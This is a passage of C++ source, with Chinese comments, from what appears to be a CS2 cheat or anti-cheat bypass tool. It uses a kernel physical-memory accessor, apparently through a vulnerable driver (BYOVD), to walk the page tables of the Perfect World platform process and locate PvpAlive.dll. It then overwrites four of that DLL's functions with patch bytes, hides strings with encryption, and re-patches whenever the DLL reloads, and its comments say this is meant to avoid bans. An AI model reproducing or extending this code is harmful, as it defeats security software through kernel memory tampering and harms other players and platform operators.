        // PEB 是用户态地址, 且通常 < 0x10000000000 (64-bit user space)
        if (val >= 0x10000 && val < 0x10000000000ULL && (val & 0xFFF) == 0) {
            pebVA = val;
            break;
        }
    }
    if (!pebVA) {
        StateLog("PVP", "FindBaseFail", "step=PEB pid=%u", pid);
        return 0;
    }

    // ★ 用目标进程 CR3 翻译 PEB VA → PA
    PageTableWalker walker(cr3, kma);
    uint64_t pebPA = walker.VaToPa(pebVA);
    if (!pebPA) {
        StateLog("PVP", "FindBaseFail", "step=PEB_VaToPa pebVA=0x%llX", (unsigned long long)pebVA);
        return 0;
    }

    // PEB.Ldr (PEB 偏移 0x18, 64-bit)
    uint64_t ldrVA = 0;
    kma.ReadPhysical(pebPA + 0x18, &ldrVA, sizeof(ldrVA));
    if (!ldrVA) {
        ByovdDiag("PVP.FindBase: FAIL PEB.Ldr=0\n");
        return 0;
    }

    // PEB_LDR_DATA.InLoadOrderModuleList (偏移 0x10, 64-bit)
    // Flink 指向第一个 LDR_DATA_TABLE_ENTRY.InLoadOrderLinks
    uint64_t ldrPA = walker.VaToPa(ldrVA);
    if (!ldrPA) return 0;

    uint64_t flinkVA = 0;
    kma.ReadPhysical(ldrPA + 0x10, &flinkVA, sizeof(flinkVA));
    if (!flinkVA) return 0;

    // ★ 加密 "PvpAlive.dll" 用于比较 (ASCII, 可用 STEALTH_WSTR_DECRYPT_TO)
    wchar_t pvpAliveW[32] = {};
    STEALTH_WSTR_DECRYPT_TO("PvpAlive.dll", pvpAliveW, (int)(sizeof(pvpAliveW) / sizeof(wchar_t)));

    // 遍历 InLoadOrderModuleList (最多 512 个模块)
    uint64_t current = flinkVA;
    uintptr_t result = 0;
    for (int i = 0; i < 512 && current; i++) {
        uint64_t currentPA = walker.VaToPa(current);
        if (!currentPA) break;

        // LDR_DATA_TABLE_ENTRY (64-bit) 布局:
        //   +0x00: InLoadOrderLinks (LIST_ENTRY, 16 bytes)
        //   +0x10: InMemoryOrderLinks (LIST_ENTRY, 16 bytes)
        //   +0x20: InInitializationOrderLinks (LIST_ENTRY, 16 bytes)
        //   +0x30: DllBase (void*)
        //   +0x38: EntryPoint (void*)
        //   +0x40: SizeOfImage (ULONG)
        //   +0x48: FullDllName (UNICODE_STRING, 16 bytes: Len, MaxLen, Buf)
        //   +0x58: BaseDllName (UNICODE_STRING, 16 bytes: Len, MaxLen, Buf)

        uint64_t dllBase = 0;
        kma.ReadPhysical(currentPA + 0x30, &dllBase, sizeof(dllBase));
        if (!dllBase) {
            // 移动到下一个
            kma.ReadPhysical(currentPA, &current, sizeof(current));
            continue;
        }

        // 读取 BaseDllName (UNICODE_STRING)
        uint16_t nameLen = 0;
        uint64_t nameBuf = 0;
        kma.ReadPhysical(currentPA + 0x58, &nameLen, sizeof(nameLen));
        kma.ReadPhysical(currentPA + 0x60, &nameBuf, sizeof(nameBuf));

        if (nameLen > 0 && nameLen < 512 && nameBuf) {
            uint64_t namePA = walker.VaToPa(nameBuf);
            if (namePA) {
                wchar_t nameBufW[128] = {};
                size_t readChars = nameLen / sizeof(wchar_t);
                if (readChars > 127) readChars = 127;
                kma.ReadPhysical(namePA, nameBufW, readChars * sizeof(wchar_t));
                nameBufW[readChars] = 0;

                if (_wcsicmp(nameBufW, pvpAliveW) == 0) {
                    result = (uintptr_t)dllBase;
                    ByovdDiag("PVP.FindBase: OK PvpAlive.dll base=0x%llX (pid=%u)\n",
                        (unsigned long long)dllBase, pid);
                    break;
                }
            }
        }

        // 移动到下一个 (InLoadOrderLinks.Flink)
        kma.ReadPhysical(currentPA, &current, sizeof(current));
    }

    SecureZeroMemory(pvpAliveW, sizeof(pvpAliveW));
    return result;
}

// --- PatchFunction ---
// Patch 单个函数 (特征字节匹配 + 写入 patch)
bool PvpAlivePatcher::PatchFunction(uint64_t cr3, uintptr_t pvpAliveBase,
                                     uintptr_t rva, const uint8_t* sig, size_t sigLen,
                                     const uint8_t* patch, size_t patchLen,
                                     uint8_t* outOriginal, size_t originalBufSize) {
    if (!cr3 || !pvpAliveBase || !sig || !patch) return false;

    KernelMemoryAccessor& kma = KernelMemoryAccessor::Instance();

    // 计算函数 VA
    uint64_t funcVA = pvpAliveBase + rva;

    // 翻译 VA → PA
    PageTableWalker walker(cr3, kma);
    uint64_t funcPA = walker.VaToPa(funcVA);
    if (!funcPA) {
        ByovdDiag("PVP.Patch: FAIL VA→PA (VA=0x%llX)\n", (unsigned long long)funcVA);
        return false;
    }

    // 读取函数入口 64 字节
    uint8_t entryBuf[64] = {};
    if (!kma.ReadPhysical(funcPA, entryBuf, sizeof(entryBuf))) {
        ByovdDiag("PVP.Patch: FAIL ReadPhysical (PA=0x%llX)\n", (unsigned long long)funcPA);
        return false;
    }

    // 特征字节匹配 (前 sigLen 字节)
    if (memcmp(entryBuf, sig, sigLen) != 0) {
        ByovdDiag("PVP.Patch: FAIL sig mismatch (VA=0x%llX)\n", (unsigned long long)funcVA);
        return false;
    }

    // 保存原始字节
    size_t saveLen = (patchLen < originalBufSize) ? patchLen : originalBufSize;
    memcpy(outOriginal, entryBuf, saveLen);

    // 写入 patch
    if (!kma.WritePhysical(funcPA, patch, patchLen)) {
        ByovdDiag("PVP.Patch: FAIL WritePhysical (PA=0x%llX)\n", (unsigned long long)funcPA);
        return false;
    }

    ByovdDiag("PVP.Patch: OK VA=0x%llX PA=0x%llX (%zu bytes)\n",
        (unsigned long long)funcVA, (unsigned long long)funcPA, patchLen);
    return true;
}

// --- Install ---
bool PvpAlivePatcher::Install() {
    if (m_active) return true;

    // ★ v3.290 DIAG: 用 StateLog 替代 ByovdDiag (NDEBUG 下 ByovdDiag 被消除)
    StateLog("PVP", "InstallStart", "");

    // 1. 查找完美平台 PID
    m_pwaPid = FindPerfectWorldPid();
    if (!m_pwaPid) {
        StateLog("PVP", "InstallFail", "step=FindPid 完美平台 not found");
        return false;
    }
    StateLog("PVP", "InstallStep", "step=pid ok=%u", m_pwaPid);

    // 2. 获取 CR3
    m_pwaCR3 = GetProcessCR3(m_pwaPid);
    if (!m_pwaCR3) {
        StateLog("PVP", "InstallFail", "step=GetCR3 pid=%u", m_pwaPid);
        return false;
    }
    StateLog("PVP", "InstallStep", "step=cr3 ok=0x%llX", (unsigned long long)m_pwaCR3);

    // 3. 查找 PvpAlive.dll 基址
    m_pvpAliveBase = FindPvpAliveBase(m_pwaPid, m_pwaCR3);
    if (!m_pvpAliveBase) {
        StateLog("PVP", "InstallFail", "step=FindBase PvpAlive.dll not loaded");
        return false;
    }
    StateLog("PVP", "InstallStep", "step=base ok=0x%llX", (unsigned long long)m_pvpAliveBase);

    // 4. Patch 4 个函数
    m_patchedCount = 0;
    for (int i = 0; i < 4; i++) {
        const auto& fi = g_funcs[i];
        m_funcs[i].rva = fi.rva;
        m_funcs[i].originalLen = fi.patchLen;

        bool ok = PatchFunction(m_pwaCR3, m_pvpAliveBase,
                                fi.rva, fi.sig, fi.sigLen,
                                fi.patch, fi.patchLen,
                                m_funcs[i].original, sizeof(m_funcs[i].original));
        if (ok) {
            m_funcs[i].patched = true;
            m_patchedCount++;
            StateLog("PVP", "PatchOK", "func=%s rva=0x%llX",
                     fi.name, (unsigned long long)fi.rva);
        } else {
            m_funcs[i].patched = false;
            StateLog("PVP", "PatchFail", "func=%s rva=0x%llX",
                     fi.name, (unsigned long long)fi.rva);
        }
    }

    StateLog("PVP", "InstallDone", "patched=%d/4", m_patchedCount);
    m_active = (m_patchedCount > 0);
    return m_active;
}

// --- Uninstall ---
void PvpAlivePatcher::Uninstall() {
    if (!m_active || !m_pwaCR3 || !m_pvpAliveBase) {
        m_active = false;
        return;
    }

    // ★ BUILD 567 v3.296 FIX: 验证完美平台进程是否仍在运行
    //   原因: CS2 退出后调用 Uninstall, 如果完美平台进程已退出,
    //         m_pwaCR3 指向的页表已被内核释放, VaToPa 读取已释放物理页 → 数据损坏风险.
    //   修复: 用 OpenProcess 检查进程是否存活, 已退出则跳过 Uninstall (PvpAlive.dll 已释放, 无需恢复).
    //   安全性: PvpAlive.dll 随完美平台进程退出而释放, 不恢复原始字节无影响.
    //   ★ v3.296 FIX-10: OpenProcess 失败时用 Toolhelp32 验证进程是否存在
    //     原因: OpenProcess 可能因权限不足返回 NULL (完美平台以更高权限运行),
    //           误判为"进程已退出"跳过 Uninstall → PvpAlive.dll patch 未恢复 → 封号.
    //     修复: OpenProcess 失败时用 CreateToolhelp32Snapshot 验证 PID 是否存在,
    //           存在则继续 Uninstall (页表有效), 不存在则跳过.
    if (m_pwaPid) {
        bool processAlive = false;
        HANDLE hCheck = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, m_pwaPid);
        if (hCheck) {
            DWORD exitCode = STILL_ACTIVE;
            BOOL gotExit = GetExitCodeProcess(hCheck, &exitCode);
            CloseHandle(hCheck);
            processAlive = (!gotExit || exitCode == STILL_ACTIVE);
        } else {
            // OpenProcess 失败 — 用 Toolhelp32 验证进程是否存在
            HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (snap != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32W pe = {};
                pe.dwSize = sizeof(pe);
                if (Process32FirstW(snap, &pe)) {
                    do {
                        if (pe.th32ProcessID == m_pwaPid) {
                            processAlive = true;
                            break;
                        }
                    } while (Process32NextW(snap, &pe));
                }
                CloseHandle(snap);
            }
        }
        if (!processAlive) {
            // 进程已退出 — 跳过 Uninstall
            StateLog("PVP", "UninstallSkip", "pid=%u exited", m_pwaPid);
            m_active = false;
            m_patchedCount = 0;
            return;
        }
    }

    KernelMemoryAccessor& kma = KernelMemoryAccessor::Instance();

    for (int i = 0; i < 4; i++) {
        if (!m_funcs[i].patched) continue;

        uint64_t funcVA = m_pvpAliveBase + m_funcs[i].rva;
        PageTableWalker walker(m_pwaCR3, kma);
        uint64_t funcPA = walker.VaToPa(funcVA);
        if (funcPA) {
            kma.WritePhysical(funcPA, m_funcs[i].original, m_funcs[i].originalLen);
            ByovdDiag("PVP.Uninstall: restored VA=0x%llX\n", (unsigned long long)funcVA);
        }
        m_funcs[i].patched = false;
    }

    m_active = false;
    m_patchedCount = 0;
    StateLog("PVP", "Uninstall", "OK");
}

// --- Maintain ---
bool PvpAlivePatcher::Maintain() {
    if (!m_active) {
        // 尝试安装 (完美平台可能刚启动)
        return Install();
    }

    // ★ v3.296 FIX-11: 验证完美平台进程是否仍在运行
    //   原因: Maintain 用 m_pwaCR3 翻译页表, 如果完美平台进程已退出,
    //         m_pwaCR3 指向已释放的页表, VaToPa 读取已释放物理页 → 数据损坏.
    //   修复: 用 OpenProcess + Toolhelp32 验证进程存活, 已退出则标记 inactive.
    if (m_pwaPid) {
        bool processAlive = false;
        HANDLE hCheck = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, m_pwaPid);
        if (hCheck) {
            DWORD exitCode = STILL_ACTIVE;
            BOOL gotExit = GetExitCodeProcess(hCheck, &exitCode);
            CloseHandle(hCheck);
            processAlive = (!gotExit || exitCode == STILL_ACTIVE);
        } else {
            // OpenProcess 失败 — 用 Toolhelp32 验证进程是否存在
            HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (snap != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32W pe = {};
                pe.dwSize = sizeof(pe);
                if (Process32FirstW(snap, &pe)) {
                    do {
                        if (pe.th32ProcessID == m_pwaPid) {
                            processAlive = true;
                            break;
                        }
                    } while (Process32NextW(snap, &pe));
                }
                CloseHandle(snap);
            }
        }
        if (!processAlive) {
            // 完美平台进程已退出 — 标记 inactive, 不再 patch
            StateLog("PVP", "MaintainSkip", "pid=%u exited", m_pwaPid);
            m_active = false;
            m_patchedCount = 0;
            for (int i = 0; i < 4; i++) m_funcs[i].patched = false;
            return false;
        }
    }

    // 检测 PvpAlive.dll 是否重载 (基址变化)
    uintptr_t curBase = FindPvpAliveBase(m_pwaPid, m_pwaCR3);
    if (curBase == m_pvpAliveBase) {
        return true;  // 基址未变, patch 仍有效
    }

    // PvpAlive.dll 重载, 重新 patch
    ByovdDiag("PVP.Maintain: PvpAlive reloaded (old=0x%llX new=0x%llX), re-patching...\n",
        (unsigned long long)m_pvpAliveBase, (unsigned long long)curBase);

    // 标记所有函数为未 patch
    for (int i = 0; i < 4; i++) m_funcs[i].patched = false;
    m_patchedCount = 0;
    m_pvpAliveBase = curBase;

    if (!m_pvpAliveBase) {
        m_active = false;
        return false;
    }

    // 重新 patch
    for (int i = 0; i < 4; i++) {
        const auto& fi = g_funcs[i];
        bool ok = PatchFunction(m_pwaCR3, m_pvpAliveBase,
                                fi.rva, fi.sig, fi.sigLen,
                                fi.patch, fi.patchLen,
                                m_funcs[i].original, sizeof(m_funcs[i].original));
        if (ok) {
            m_funcs[i].patched = true;
            m_patchedCount++;
        }
    }

    ByovdDiag("PVP.Maintain: re-patch done (%d/4)\n", m_patchedCount);
    m_active = (m_patchedCount > 0);
    return m_active;
}

} // namespace stealth
